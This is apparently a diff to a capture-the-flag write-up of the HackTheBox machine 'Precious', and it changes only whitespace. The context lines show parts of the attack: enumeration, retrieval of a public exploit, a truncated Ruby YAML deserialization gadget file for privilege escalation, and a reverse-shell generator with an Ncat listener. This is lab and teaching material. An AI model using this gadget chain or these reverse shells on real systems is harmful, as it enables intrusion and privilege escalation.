@@ -32,8 +32,11 @@ PORT   STATE SERVICE VERSION
 ```
 
 What we have: 
+
 - An SSH server, but no credentials to leverage it.
 - A web server (`nginx 1.18.0`) which redirects us to `precious.htb`. We will need to add this domain to our local DNS file (`/etc/hosts`) and then re-scan port `80` so `nmap` can run more script on it.
+
+<!-- -->
 
 ```bash
 # adding domain to local DNS file
@@ -60,8 +63,11 @@ PORT   STATE SERVICE VERSION
 ```
 
 Extra info:
+
 - From the title, we can expect to find a functionality that converts web pages to PDF.
 - We have another app, `Phusion Passenger(R)`, along with its version `6.0.15`.
+
+<!-- -->
 
 Let's first find out what **Phusion Passenger** is. According to [Wikipedia](https://en.wikipedia.org/wiki/Phusion_Passenger):
 
@@ -127,7 +133,6 @@ $ searchsploit -m 51293
  Verified: True
 File Type: Python script, Unicode text, UTF-8 text executable
 Copied to: /home/kali/htb/fullpwn/precious/51293.py
-
 
 ```
 
@@ -334,10 +339,13 @@ We can try using just the last payload since the first two are for previous vers
 ```bash
 henry@precious:/tmp$ cat dependencies.yml
 ---
+
 - !ruby/object:Gem::Installer
     i: x
+
 - !ruby/object:Gem::SpecFetcher
     i: y
+
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
@@ -380,7 +388,6 @@ $ /opt/revshellgen/revshellgen.py
  / __// -_)| |/ / (_-< / _ \/ -_) / /  / /  / _ `// -_) / _ \
 /_/   \__/ |___/ /___//_//_/\__/ /_/  /_/   \_, / \__/ /_//_/
                                            /___/
-
 
 ---------- [ SELECT IP ] ----------
 
@@ -434,10 +441,13 @@ Ncat: Listening on 0.0.0.0:1337
 ```bash
 henry@precious:/tmp$ cat dependencies.yml
 ---
+
 - !ruby/object:Gem::Installer
     i: x
+
 - !ruby/object:Gem::SpecFetcher
     i: y
+
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
@@ -483,7 +493,6 @@ end
 ```
 
 In most cases, this means that the script will **ONLY** search within the same directory that itself resides, in this case, `/opt/`. But it was able to read it from the `/tmp` directory! After some reading, I ended up making a [StackOverFlow post](https://stackoverflow.com/questions/77850419/file-referencing-using-relative-paths-on-ruby) and that was the answer from [Casper](https://stackoverflow.com/users/823617/casper):
-
 
 ![](casper_answer.png){: .normal}
 
